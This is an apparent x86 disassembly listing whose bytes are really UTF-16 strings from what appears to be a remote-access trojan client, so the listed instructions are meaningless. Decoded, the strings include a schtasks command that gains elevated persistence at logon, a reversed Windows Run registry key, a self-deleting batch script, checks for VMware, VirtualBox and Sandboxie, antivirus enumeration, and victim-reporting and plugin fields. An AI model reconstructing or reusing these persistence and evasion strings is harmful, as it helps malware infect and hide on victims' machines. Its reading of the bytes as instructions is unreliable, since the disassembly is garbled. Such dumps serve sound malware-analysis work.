  40b6fb:	00 67 00             	add    %ah,0x0(%edi)
  40b6fe:	65 00 00             	add    %al,%gs:(%eax)
  40b701:	07                   	pop    %es
  40b702:	63 00                	arpl   %eax,(%eax)
  40b704:	6d                   	insl   (%dx),%es:(%edi)
  40b705:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40b709:	69 2f 00 63 00 20    	imul   $0x20006300,(%edi),%ebp
  40b70f:	00 73 00             	add    %dh,0x0(%ebx)
  40b712:	63 00                	arpl   %eax,(%eax)
  40b714:	68 00 74 00 61       	push   $0x61007400
  40b719:	00 73 00             	add    %dh,0x0(%ebx)
  40b71c:	6b 00 73             	imul   $0x73,(%eax),%eax
  40b71f:	00 20                	add    %ah,(%eax)
  40b721:	00 2f                	add    %ch,(%edi)
  40b723:	00 63 00             	add    %ah,0x0(%ebx)
  40b726:	72 00                	jb     0x40b728
  40b728:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40b72c:	74 00                	je     0x40b72e
  40b72e:	65 00 20             	add    %ah,%gs:(%eax)
  40b731:	00 2f                	add    %ch,(%edi)
  40b733:	00 66 00             	add    %ah,0x0(%esi)
  40b736:	20 00                	and    %al,(%eax)
  40b738:	2f                   	das
  40b739:	00 73 00             	add    %dh,0x0(%ebx)
  40b73c:	63 00                	arpl   %eax,(%eax)
  40b73e:	20 00                	and    %al,(%eax)
  40b740:	6f                   	outsl  %ds:(%esi),(%dx)
  40b741:	00 6e 00             	add    %ch,0x0(%esi)
  40b744:	6c                   	insb   (%dx),%es:(%edi)
  40b745:	00 6f 00             	add    %ch,0x0(%edi)
  40b748:	67 00 6f 00          	add    %ch,0x0(%bx)
  40b74c:	6e                   	outsb  %ds:(%esi),(%dx)
  40b74d:	00 20                	add    %ah,(%eax)
  40b74f:	00 2f                	add    %ch,(%edi)
  40b751:	00 72 00             	add    %dh,0x0(%edx)
  40b754:	6c                   	insb   (%dx),%es:(%edi)
  40b755:	00 20                	add    %ah,(%eax)
  40b757:	00 68 00             	add    %ch,0x0(%eax)
  40b75a:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  40b760:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b764:	74 00                	je     0x40b766
  40b766:	20 00                	and    %al,(%eax)
  40b768:	2f                   	das
  40b769:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40b76d:	00 20                	add    %ah,(%eax)
  40b76f:	00 22                	add    %ah,(%edx)
  40b771:	00 00                	add    %al,(%eax)
  40b773:	11 22                	adc    %esp,(%edx)
  40b775:	00 20                	add    %ah,(%eax)
  40b777:	00 2f                	add    %ch,(%edi)
  40b779:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40b77d:	00 20                	add    %ah,(%eax)
  40b77f:	00 27                	add    %ah,(%edi)
  40b781:	00 22                	add    %ah,(%edx)
  40b783:	00 01                	add    %al,(%ecx)
  40b785:	13 22                	adc    (%edx),%esp
  40b787:	00 27                	add    %ah,(%edi)
  40b789:	00 20                	add    %ah,(%eax)
  40b78b:	00 26                	add    %ah,(%esi)
  40b78d:	00 20                	add    %ah,(%eax)
  40b78f:	00 65 00             	add    %ah,0x0(%ebp)
  40b792:	78 00                	js     0x40b794
  40b794:	69 00 74 00 01 5d    	imul   $0x5d010074,(%eax),%eax
  40b79a:	5c                   	pop    %esp
  40b79b:	00 6e 00             	add    %ch,0x0(%esi)
  40b79e:	75 00                	jne    0x40b7a0
  40b7a0:	52                   	push   %edx
  40b7a1:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  40b7a5:	00 6f 00             	add    %ch,0x0(%edi)
  40b7a8:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  40b7ae:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40b7b2:	74 00                	je     0x40b7b4
  40b7b4:	6e                   	outsb  %ds:(%esi),(%dx)
  40b7b5:	00 65 00             	add    %ah,0x0(%ebp)
  40b7b8:	72 00                	jb     0x40b7ba
  40b7ba:	72 00                	jb     0x40b7bc
  40b7bc:	75 00                	jne    0x40b7be
  40b7be:	43                   	inc    %ebx
  40b7bf:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40b7c3:	00 77 00             	add    %dh,0x0(%edi)
  40b7c6:	6f                   	outsl  %ds:(%esi),(%dx)
  40b7c7:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40b7cb:	00 69 00             	add    %ch,0x0(%ecx)
  40b7ce:	57                   	push   %edi
  40b7cf:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40b7d3:	00 66 00             	add    %ah,0x0(%esi)
  40b7d6:	6f                   	outsl  %ds:(%esi),(%dx)
  40b7d7:	00 73 00             	add    %dh,0x0(%ebx)
  40b7da:	6f                   	outsl  %ds:(%esi),(%dx)
  40b7db:	00 72 00             	add    %dh,0x0(%edx)
  40b7de:	63 00                	arpl   %eax,(%eax)
  40b7e0:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40b7e6:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b7ea:	61                   	popa
  40b7eb:	00 77 00             	add    %dh,0x0(%edi)
  40b7ee:	74 00                	je     0x40b7f0
  40b7f0:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40b7f4:	53                   	push   %ebx
  40b7f5:	00 00                	add    %al,(%eax)
  40b7f7:	03 22                	add    (%edx),%esp
  40b7f9:	00 00                	add    %al,(%eax)
  40b7fb:	09 2e                	or     %ebp,(%esi)
  40b7fd:	00 62 00             	add    %ah,0x0(%edx)
  40b800:	61                   	popa
  40b801:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40b805:	13 40 00             	adc    0x0(%eax),%eax
  40b808:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b80c:	68 00 6f 00 20       	push   $0x20006f00
  40b811:	00 6f 00             	add    %ch,0x0(%edi)
  40b814:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40b818:	00 1f                	add    %bl,(%edi)
  40b81a:	74 00                	je     0x40b81c
  40b81c:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40b822:	6f                   	outsl  %ds:(%esi),(%dx)
  40b823:	00 75 00             	add    %dh,0x0(%ebp)
  40b826:	74 00                	je     0x40b828
  40b828:	20 00                	and    %al,(%eax)
  40b82a:	33 00                	xor    (%eax),%eax
  40b82c:	20 00                	and    %al,(%eax)
  40b82e:	3e 00 20             	add    %ah,%ds:(%eax)
  40b831:	00 4e 00             	add    %cl,0x0(%esi)
  40b834:	55                   	push   %ebp
  40b835:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40b839:	15 53 00 54 00       	adc    $0x540053,%eax
  40b83e:	41                   	inc    %ecx
  40b83f:	00 52 00             	add    %dl,0x0(%edx)
  40b842:	54                   	push   %esp
  40b843:	00 20                	add    %ah,(%eax)
  40b845:	00 22                	add    %ah,(%edx)
  40b847:	00 22                	add    %ah,(%edx)
  40b849:	00 20                	add    %ah,(%eax)
  40b84b:	00 22                	add    %ah,(%edx)
  40b84d:	00 00                	add    %al,(%eax)
  40b84f:	07                   	pop    %es
  40b850:	43                   	inc    %ebx
  40b851:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40b855:	00 00                	add    %al,(%eax)
  40b857:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40b85b:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40b85f:	00 22                	add    %ah,(%edx)
  40b861:	00 00                	add    %al,(%eax)
  40b863:	0f 22 00             	mov    %eax,%cr0
  40b866:	20 00                	and    %al,(%eax)
  40b868:	2f                   	das
  40b869:	00 66 00             	add    %ah,0x0(%esi)
  40b86c:	20 00                	and    %al,(%eax)
  40b86e:	2f                   	das
  40b86f:	00 71 00             	add    %dh,0x0(%ecx)
  40b872:	00 05 78 00 70 00    	add    %al,0x700078
  40b878:	00 45 53             	add    %al,0x53(%ebp)
  40b87b:	00 65 00             	add    %ah,0x0(%ebp)
  40b87e:	6c                   	insb   (%dx),%es:(%edi)
  40b87f:	00 65 00             	add    %ah,0x0(%ebp)
  40b882:	63 00                	arpl   %eax,(%eax)
  40b884:	74 00                	je     0x40b886
  40b886:	20 00                	and    %al,(%eax)
  40b888:	2a 00                	sub    (%eax),%al
  40b88a:	20 00                	and    %al,(%eax)
  40b88c:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40b890:	6f                   	outsl  %ds:(%esi),(%dx)
  40b891:	00 6d 00             	add    %ch,0x0(%ebp)
  40b894:	20 00                	and    %al,(%eax)
  40b896:	57                   	push   %edi
  40b897:	00 69 00             	add    %ch,0x0(%ecx)
  40b89a:	6e                   	outsb  %ds:(%esi),(%dx)
  40b89b:	00 33                	add    %dh,(%ebx)
  40b89d:	00 32                	add    %dh,(%edx)
  40b89f:	00 5f 00             	add    %bl,0x0(%edi)
  40b8a2:	43                   	inc    %ebx
  40b8a3:	00 6f 00             	add    %ch,0x0(%edi)
  40b8a6:	6d                   	insl   (%dx),%es:(%edi)
  40b8a7:	00 70 00             	add    %dh,0x0(%eax)
  40b8aa:	75 00                	jne    0x40b8ac
  40b8ac:	74 00                	je     0x40b8ae
  40b8ae:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b8b2:	53                   	push   %ebx
  40b8b3:	00 79 00             	add    %bh,0x0(%ecx)
  40b8b6:	73 00                	jae    0x40b8b8
  40b8b8:	74 00                	je     0x40b8ba
  40b8ba:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40b8be:	00 19                	add    %bl,(%ecx)
  40b8c0:	4d                   	dec    %ebp
  40b8c1:	00 61 00             	add    %ah,0x0(%ecx)
  40b8c4:	6e                   	outsb  %ds:(%esi),(%dx)
  40b8c5:	00 75 00             	add    %dh,0x0(%ebp)
  40b8c8:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40b8cc:	63 00                	arpl   %eax,(%eax)
  40b8ce:	74 00                	je     0x40b8d0
  40b8d0:	75 00                	jne    0x40b8d2
  40b8d2:	72 00                	jb     0x40b8d4
  40b8d4:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b8d8:	00 2b                	add    %ch,(%ebx)
  40b8da:	6d                   	insl   (%dx),%es:(%edi)
  40b8db:	00 69 00             	add    %ch,0x0(%ecx)
  40b8de:	63 00                	arpl   %eax,(%eax)
  40b8e0:	72 00                	jb     0x40b8e2
  40b8e2:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8e3:	00 73 00             	add    %dh,0x0(%ebx)
  40b8e6:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8e7:	00 66 00             	add    %ah,0x0(%esi)
  40b8ea:	74 00                	je     0x40b8ec
  40b8ec:	20 00                	and    %al,(%eax)
  40b8ee:	63 00                	arpl   %eax,(%eax)
  40b8f0:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8f1:	00 72 00             	add    %dh,0x0(%edx)
  40b8f4:	70 00                	jo     0x40b8f6
  40b8f6:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8f7:	00 72 00             	add    %dh,0x0(%edx)
  40b8fa:	61                   	popa
  40b8fb:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40b8ff:	00 6f 00             	add    %ch,0x0(%edi)
  40b902:	6e                   	outsb  %ds:(%esi),(%dx)
  40b903:	00 00                	add    %al,(%eax)
  40b905:	0b 4d 00             	or     0x0(%ebp),%ecx
  40b908:	6f                   	outsl  %ds:(%esi),(%dx)
  40b909:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40b90d:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b911:	0f 56 00             	orps   (%eax),%xmm0
  40b914:	49                   	dec    %ecx
  40b915:	00 52 00             	add    %dl,0x0(%edx)
  40b918:	54                   	push   %esp
  40b919:	00 55 00             	add    %dl,0x0(%ebp)
  40b91c:	41                   	inc    %ecx
  40b91d:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40b921:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40b926:	77 00                	ja     0x40b928
  40b928:	61                   	popa
  40b929:	00 72 00             	add    %dh,0x0(%edx)
  40b92c:	65 00 00             	add    %al,%gs:(%eax)
  40b92f:	15 56 00 69 00       	adc    $0x690056,%eax
  40b934:	72 00                	jb     0x40b936
  40b936:	74 00                	je     0x40b938
  40b938:	75 00                	jne    0x40b93a
  40b93a:	61                   	popa
  40b93b:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40b93f:	00 6f 00             	add    %ch,0x0(%edi)
  40b942:	78 00                	js     0x40b944
  40b944:	00 17                	add    %dl,(%edi)
  40b946:	53                   	push   %ebx
  40b947:	00 62 00             	add    %ah,0x0(%edx)
  40b94a:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40b950:	6c                   	insb   (%dx),%es:(%edi)
  40b951:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40b955:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40b959:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b95d:	11 45 00             	adc    %eax,0x0(%ebp)
  40b960:	72 00                	jb     0x40b962
  40b962:	72 00                	jb     0x40b964
  40b964:	20 00                	and    %al,(%eax)
  40b966:	48                   	dec    %eax
  40b967:	00 57 00             	add    %dl,0x0(%edi)
  40b96a:	49                   	dec    %ecx
  40b96b:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40b96f:	05 78 00 32 00       	add    $0x320078,%eax
  40b974:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40b97a:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40b980:	74 00                	je     0x40b982
  40b982:	49                   	dec    %ecx
  40b983:	00 6e 00             	add    %ch,0x0(%esi)
  40b986:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40b98a:	00 09                	add    %cl,(%ecx)
  40b98c:	48                   	dec    %eax
  40b98d:	00 57 00             	add    %dl,0x0(%edi)
  40b990:	49                   	dec    %ecx
  40b991:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40b995:	09 55 00             	or     %edx,0x0(%ebp)
  40b998:	73 00                	jae    0x40b99a
  40b99a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b99e:	00 05 4f 00 53 00    	add    %al,0x53004f
  40b9a4:	00 13                	add    %dl,(%ebx)
  40b9a6:	4d                   	dec    %ebp
  40b9a7:	00 69 00             	add    %ch,0x0(%ecx)
  40b9aa:	63 00                	arpl   %eax,(%eax)
  40b9ac:	72 00                	jb     0x40b9ae
  40b9ae:	6f                   	outsl  %ds:(%esi),(%dx)
  40b9af:	00 73 00             	add    %dh,0x0(%ebx)
  40b9b2:	6f                   	outsl  %ds:(%esi),(%dx)
  40b9b3:	00 66 00             	add    %ah,0x0(%esi)
  40b9b6:	74 00                	je     0x40b9b8
  40b9b8:	00 03                	add    %al,(%ebx)
  40b9ba:	20 00                	and    %al,(%eax)
  40b9bc:	00 09                	add    %cl,(%ecx)
  40b9be:	54                   	push   %esp
  40b9bf:	00 72 00             	add    %dh,0x0(%edx)
  40b9c2:	75 00                	jne    0x40b9c4
  40b9c4:	65 00 00             	add    %al,%gs:(%eax)
  40b9c7:	0b 36                	or     (%esi),%esi
  40b9c9:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b9cc:	62 00                	bound  %eax,(%eax)
  40b9ce:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40b9d4:	46                   	inc    %esi
  40b9d5:	00 61 00             	add    %ah,0x0(%ecx)
  40b9d8:	6c                   	insb   (%dx),%es:(%edi)
  40b9d9:	00 73 00             	add    %dh,0x0(%ebx)
  40b9dc:	65 00 00             	add    %al,%gs:(%eax)
  40b9df:	0b 33                	or     (%ebx),%esi
  40b9e1:	00 32                	add    %dh,(%edx)
  40b9e3:	00 62 00             	add    %ah,0x0(%edx)
  40b9e6:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40b9ec:	50                   	push   %eax
  40b9ed:	00 61 00             	add    %ah,0x0(%ecx)
  40b9f0:	74 00                	je     0x40b9f2
  40b9f2:	68 00 00 0f 56       	push   $0x560f0000
  40b9f7:	00 65 00             	add    %ah,0x0(%ebp)
  40b9fa:	72 00                	jb     0x40b9fc
  40b9fc:	73 00                	jae    0x40b9fe
  40b9fe:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40ba04:	00 0b                	add    %cl,(%ebx)
  40ba06:	41                   	inc    %ecx
  40ba07:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40ba0b:	00 69 00             	add    %ch,0x0(%ecx)
  40ba0e:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba0f:	00 00                	add    %al,(%eax)
  40ba11:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40ba15:	00 75 00             	add    %dh,0x0(%ebp)
  40ba18:	65 00 00             	add    %al,%gs:(%eax)
  40ba1b:	0b 66 00             	or     0x0(%esi),%esp
  40ba1e:	61                   	popa
  40ba1f:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40ba23:	00 65 00             	add    %ah,0x0(%ebp)
  40ba26:	00 17                	add    %dl,(%edi)
  40ba28:	50                   	push   %eax
  40ba29:	00 65 00             	add    %ah,0x0(%ebp)
  40ba2c:	72 00                	jb     0x40ba2e
  40ba2e:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40ba32:	72 00                	jb     0x40ba34
  40ba34:	6d                   	insl   (%dx),%es:(%edi)
  40ba35:	00 61 00             	add    %ah,0x0(%ecx)
  40ba38:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba39:	00 63 00             	add    %ah,0x0(%ebx)
  40ba3c:	65 00 00             	add    %al,%gs:(%eax)
  40ba3f:	11 50 00             	adc    %edx,0x0(%eax)
  40ba42:	61                   	popa
  40ba43:	00 73 00             	add    %dh,0x0(%ebx)
  40ba46:	74 00                	je     0x40ba48
  40ba48:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40ba4c:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40ba52:	41                   	inc    %ecx
  40ba53:	00 6e 00             	add    %ch,0x0(%esi)
  40ba56:	74 00                	je     0x40ba58
  40ba58:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40ba5e:	72 00                	jb     0x40ba60
  40ba60:	75 00                	jne    0x40ba62
  40ba62:	73 00                	jae    0x40ba64
  40ba64:	00 13                	add    %dl,(%ebx)
  40ba66:	49                   	dec    %ecx
  40ba67:	00 6e 00             	add    %ch,0x0(%esi)
  40ba6a:	73 00                	jae    0x40ba6c
  40ba6c:	74 00                	je     0x40ba6e
  40ba6e:	61                   	popa
  40ba6f:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40ba73:	00 65 00             	add    %ah,0x0(%ebp)
  40ba76:	64 00 00             	add    %al,%fs:(%eax)
  40ba79:	09 50 00             	or     %edx,0x0(%eax)
  40ba7c:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba7d:	00 6e 00             	add    %ch,0x0(%esi)
  40ba80:	67 00 00             	add    %al,(%bx,%si)
  40ba83:	0b 47 00             	or     0x0(%edi),%eax
  40ba86:	72 00                	jb     0x40ba88
  40ba88:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba89:	00 75 00             	add    %dh,0x0(%ebp)
  40ba8c:	70 00                	jo     0x40ba8e
  40ba8e:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40ba94:	00 2b                	add    %ch,(%ebx)
  40ba96:	5c                   	pop    %esp
  40ba97:	00 72 00             	add    %dh,0x0(%edx)
  40ba9a:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba9b:	00 6f 00             	add    %ch,0x0(%edi)
  40ba9e:	74 00                	je     0x40baa0
  40baa0:	5c                   	pop    %esp
  40baa1:	00 53 00             	add    %dl,0x0(%ebx)
  40baa4:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40baa8:	75 00                	jne    0x40baaa
  40baaa:	72 00                	jb     0x40baac
  40baac:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40bab2:	43                   	inc    %ebx
  40bab3:	00 65 00             	add    %ah,0x0(%ebp)
  40bab6:	6e                   	outsb  %ds:(%esi),(%dx)
  40bab7:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40babb:	00 72 00             	add    %dh,0x0(%edx)
  40babe:	32 00                	xor    (%eax),%al
  40bac0:	00 3d 53 00 65 00    	add    %bh,0x650053
  40bac6:	6c                   	insb   (%dx),%es:(%edi)
  40bac7:	00 65 00             	add    %ah,0x0(%ebp)
  40baca:	63 00                	arpl   %eax,(%eax)
  40bacc:	74 00                	je     0x40bace
  40bace:	20 00                	and    %al,(%eax)
  40bad0:	2a 00                	sub    (%eax),%al
  40bad2:	20 00                	and    %al,(%eax)
  40bad4:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40bad8:	6f                   	outsl  %ds:(%esi),(%dx)
  40bad9:	00 6d 00             	add    %ch,0x0(%ebp)
  40badc:	20 00                	and    %al,(%eax)
  40bade:	41                   	inc    %ecx
  40badf:	00 6e 00             	add    %ch,0x0(%esi)
  40bae2:	74 00                	je     0x40bae4
  40bae4:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40baea:	72 00                	jb     0x40baec
  40baec:	75 00                	jne    0x40baee
  40baee:	73 00                	jae    0x40baf0
  40baf0:	50                   	push   %eax
  40baf1:	00 72 00             	add    %dh,0x0(%edx)
  40baf4:	6f                   	outsl  %ds:(%esi),(%dx)
  40baf5:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40baf9:	00 63 00             	add    %ah,0x0(%ebx)
  40bafc:	74 00                	je     0x40bafe
  40bafe:	00 17                	add    %dl,(%edi)
  40bb00:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40bb04:	73 00                	jae    0x40bb06
  40bb06:	70 00                	jo     0x40bb08
  40bb08:	6c                   	insb   (%dx),%es:(%edi)
  40bb09:	00 61 00             	add    %ah,0x0(%ecx)
  40bb0c:	79 00                	jns    0x40bb0e
  40bb0e:	4e                   	dec    %esi
  40bb0f:	00 61 00             	add    %ah,0x0(%ecx)
  40bb12:	6d                   	insl   (%dx),%es:(%edi)
  40bb13:	00 65 00             	add    %ah,0x0(%ebp)
  40bb16:	00 07                	add    %al,(%edi)
  40bb18:	4e                   	dec    %esi
  40bb19:	00 2f                	add    %ch,(%edi)
  40bb1b:	00 41 00             	add    %al,0x0(%ecx)
  40bb1e:	00 05 2c 00 20 00    	add    %al,0x20002c
  40bb24:	00 13                	add    %dl,(%ebx)
  40bb26:	53                   	push   %ebx
  40bb27:	00 6f 00             	add    %ch,0x0(%edi)
  40bb2a:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40bb2f:	00 61 00             	add    %ah,0x0(%ecx)
  40bb32:	72 00                	jb     0x40bb34
  40bb34:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40bb39:	09 70 00             	or     %esi,0x0(%eax)
  40bb3c:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb3d:	00 6e 00             	add    %ch,0x0(%esi)
  40bb40:	67 00 00             	add    %al,(%bx,%si)
  40bb43:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40bb48:	75 00                	jne    0x40bb4a
  40bb4a:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40bb4e:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb4f:	00 00                	add    %al,(%eax)
  40bb51:	15 73 00 61 00       	adc    $0x610073,%eax
  40bb56:	76 00                	jbe    0x40bb58
  40bb58:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40bb5c:	6c                   	insb   (%dx),%es:(%edi)
  40bb5d:	00 75 00             	add    %dh,0x0(%ebp)
  40bb60:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40bb64:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb65:	00 00                	add    %al,(%eax)
  40bb67:	07                   	pop    %es
  40bb68:	44                   	inc    %esp
  40bb69:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40bb6d:	00 00                	add    %al,(%eax)
  40bb6f:	15 73 00 65 00       	adc    $0x650073,%eax
  40bb74:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb75:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40bb79:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bb7d:	00 67 00             	add    %ah,0x0(%edi)
  40bb80:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40bb86:	48                   	dec    %eax
  40bb87:	00 61 00             	add    %ah,0x0(%ecx)
  40bb8a:	73 00                	jae    0x40bb8c
  40bb8c:	68 00 65 00 73       	push   $0x73006500
  40bb91:	00 00                	add    %al,(%eax)
  40bb93:	09 48 00             	or     %ecx,0x0(%eax)
  40bb96:	61                   	popa
  40bb97:	00 73 00             	add    %dh,0x0(%ebx)
  40bb9a:	68 00 00 1b 50       	push   $0x501b0000
  40bb9f:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bba3:	00 67 00             	add    %ah,0x0(%edi)
  40bba6:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40bbac:	50                   	push   %eax
  40bbad:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bbb1:	00 67 00             	add    %ah,0x0(%edi)
  40bbb4:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  40bbba:	52                   	push   %edx
  40bbbb:	00 75 00             	add    %dh,0x0(%ebp)
  40bbbe:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbbf:	00 00                	add    %al,(%eax)
  40bbc1:	0f 4d 00             	cmovge (%eax),%eax
  40bbc4:	73 00                	jae    0x40bbc6
  40bbc6:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40bbca:	61                   	popa
  40bbcb:	00 63 00             	add    %ah,0x0(%ebx)
  40bbce:	6b 00 00             	imul   $0x0,(%eax),%eax
  40bbd1:	11 52 00             	adc    %edx,0x0(%edx)
  40bbd4:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bbd8:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40bbdc:	76 00                	jbe    0x40bbde
  40bbde:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40bbe3:	0b 45 00             	or     0x0(%ebp),%eax
  40bbe6:	72 00                	jb     0x40bbe8
  40bbe8:	72 00                	jb     0x40bbea
  40bbea:	6f                   	outsl  %ds:(%esi),(%dx)
  40bbeb:	00 72 00             	add    %dh,0x0(%edx)
  40bbee:	00 47 6d             	add    %al,0x6d(%edi)
  40bbf1:	00 61 00             	add    %ah,0x0(%ecx)
  40bbf4:	73 00                	jae    0x40bbf6
  40bbf6:	74 00                	je     0x40bbf8
  40bbf8:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bbfc:	4b                   	dec    %ebx
  40bbfd:	00 65 00             	add    %ah,0x0(%ebp)
  40bc00:	79 00                	jns    0x40bc02
  40bc02:	20 00                	and    %al,(%eax)
  40bc04:	63 00                	arpl   %eax,(%eax)
  40bc06:	61                   	popa
  40bc07:	00 6e 00             	add    %ch,0x0(%esi)
  40bc0a:	20 00                	and    %al,(%eax)
  40bc0c:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc0d:	00 6f 00             	add    %ch,0x0(%edi)
  40bc10:	74 00                	je     0x40bc12
  40bc12:	20 00                	and    %al,(%eax)
  40bc14:	62 00                	bound  %eax,(%eax)
  40bc16:	65 00 20             	add    %ah,%gs:(%eax)
  40bc19:	00 6e 00             	add    %ch,0x0(%esi)
  40bc1c:	75 00                	jne    0x40bc1e
  40bc1e:	6c                   	insb   (%dx),%es:(%edi)
  40bc1f:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40bc23:	00 6f 00             	add    %ch,0x0(%edi)
  40bc26:	72 00                	jb     0x40bc28
  40bc28:	20 00                	and    %al,(%eax)
  40bc2a:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40bc2e:	70 00                	jo     0x40bc30
  40bc30:	74 00                	je     0x40bc32
  40bc32:	79 00                	jns    0x40bc34
  40bc34:	2e 00 00             	add    %al,%cs:(%eax)
  40bc37:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40bc3c:	70 00                	jo     0x40bc3e
  40bc3e:	75 00                	jne    0x40bc40
  40bc40:	74 00                	je     0x40bc42
  40bc42:	20 00                	and    %al,(%eax)
  40bc44:	63 00                	arpl   %eax,(%eax)
  40bc46:	61                   	popa
  40bc47:	00 6e 00             	add    %ch,0x0(%esi)
  40bc4a:	20 00                	and    %al,(%eax)
  40bc4c:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc4d:	00 6f 00             	add    %ch,0x0(%edi)
  40bc50:	74 00                	je     0x40bc52
  40bc52:	20 00                	and    %al,(%eax)
  40bc54:	62 00                	bound  %eax,(%eax)
  40bc56:	65 00 20             	add    %ah,%gs:(%eax)
  40bc59:	00 6e 00             	add    %ch,0x0(%esi)
  40bc5c:	75 00                	jne    0x40bc5e
  40bc5e:	6c                   	insb   (%dx),%es:(%edi)
  40bc5f:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40bc63:	00 00                	add    %al,(%eax)
  40bc65:	55                   	push   %ebp
  40bc66:	49                   	dec    %ecx
  40bc67:	00 6e 00             	add    %ch,0x0(%esi)
  40bc6a:	76 00                	jbe    0x40bc6c
  40bc6c:	61                   	popa
